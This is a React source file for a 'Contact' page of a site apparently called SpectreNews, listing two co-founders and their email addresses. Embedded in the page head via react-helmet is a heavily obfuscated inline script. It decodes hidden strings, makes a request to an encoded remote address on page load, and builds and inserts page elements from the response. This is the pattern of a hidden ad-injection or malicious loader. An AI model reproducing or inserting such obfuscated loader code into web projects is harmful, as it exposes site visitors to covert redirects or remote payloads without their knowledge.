import React from "react";
import { Helmet } from 'react-helmet';
import Bar from "../bar/Bar";
import './Contact.css';
import AnimatedHeading from "../pages/AnimatedHeading";

function Contact() {
  return (
    <div className="container">
      <Helmet>
        <script type="text/javascript" data-cfasync="false">
          {`/*<![CDATA[/* */
          (function(){if(window.e20f93a1b1636f007740e83f41814287) return; window.e20f93a1b1636f007740e83f41814287="EePOxPROxIQ-krimoBLOtMZbyOF1UqOZoFA3IQY-Yzy-lOFqkMOIi98ONPTfDoW0wIPQTSjOWZ45lZI";var a=['wp5ww59HSD5owp9JEMO4RsKc','UMKZw5k2w5wpEHbDtsOZw6HCjsKE','w7DCkiDDkhTDlFoPdTpQcw==','wqI3DBsIw6/CpMKT','eMKJwrt6NsOaFVJ5EzYJw7rDkQ==','Cm3CnsK5CHA=','biBzTsOhw7VQ','RXTDicK1ADxUw6AQw7TDijHDhXHDkgkbJgXDuw==','w6HDnwfDtTXCi8KyGsO4wpAFSw==','w7bCu8OXw6FRNg==','w6vDoQbDr8OvAGMZBXfDtDLCnsOYGUtcw4TDrMKsw5PDsMK5wrrClsKYHsKNw5MN','UFDDrsKZWFrDjU44UTQow5rCucKw','VcKSw5A5w5AoC1PDoA==','woZGMFM=','OXscw5jDglU=','JjILK1YZw6pewqzDsQ==','azZsQcO3','ZyNyw6fCl8Kow7jChA==','w7gVXh4lw7w=','Jn7Cg8Kg','P8KhEnc0w7zCqnYSZcKkSw==','aTd6XMOnw5ZWw7BdAAA=','w5HDrlTDksKXw6MU','NgVqDDjCgi0GacKiw6LCmQbDi8OFwqt5wpDDiTFWSsKkTsK+X0M0DyTCp27DqwLClcKzwonDssOZw4nDqsK+JQ==','UsKHwpw8CMOjw7NM','UWPDng=='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x185));var b=function(c,d){c=c-0x0;var e=a[c];if(b['ohhgOR']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');for(var n=0x0,o,p,q=0x0,r='';p=m['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?r+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=i['indexOf'](p);}return r;});}());b['reRQpF']=function(s){var t=atob(s);var u=[];for(var v=0x0,w=t['length'];v<w;v++){u+='%'+('00'+t['charCodeAt'](v)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(u);};b['ohhgOR']={};b['WBYBQh']={};}if(b['ohhgOR'][c]===undefined){if(b['WBYBQh'][c]===undefined){var x=b['reRQpF'](c);b['WBYBQh'][c]=x;}e=b['ohhgOR'][c]=b['WBYBQh'][c];}else{e=b['ohhgOR'][c];}return e;};if(b('0x0')==typeof XMLHttpRequest){var c=new XMLHttpRequest();var d=b('0x1');c[b('0x2')]=function(){if(c[b('0x3')]!=0x4)return;var g=c[b('0x4')];if(g[b('0x5')]==0x0){var h=window[b('0x6')][b('0x7')](b('0x8'));var i=window[b('0x6')][b('0x7')](b('0x9'));i[b('0xa')](b('0xb'),g[b('0xc')][b('0xd')]);i[b('0xa')](b('0xe'),b('0xf'));h[b('0x10')](i);h[b('0x11')](window[b('0x12')]);}else{};};c[b('0x13')](b('0x14'),d,true);c[b('0x15')]();}else{};})(); 
          /*]]>/* */`}
        </script>
      </Helmet>

      <Bar search={false} />

  <AnimatedHeading text="Meet the Team" />
      
 <div className="panel-safar">
        <h2>Michael Safar</h2>
        <p>A developer based out of St. Louis, MO. One of the Co-founders of SpectreNews.</p>
        <p>Reach me at: michaelsafar024@gmail.com</p>
      </div>

      <div className="panel-teschner">
        <h2>Michael Teschner</h2>
        <p>A developer based out of St. Louis, MO. One of the Co-founders of SpectreNews.</p>
        <p>Reach me at: mteschner24@gmail.com</p>
      </div>

     
    </div>
  );
}

export default Contact;
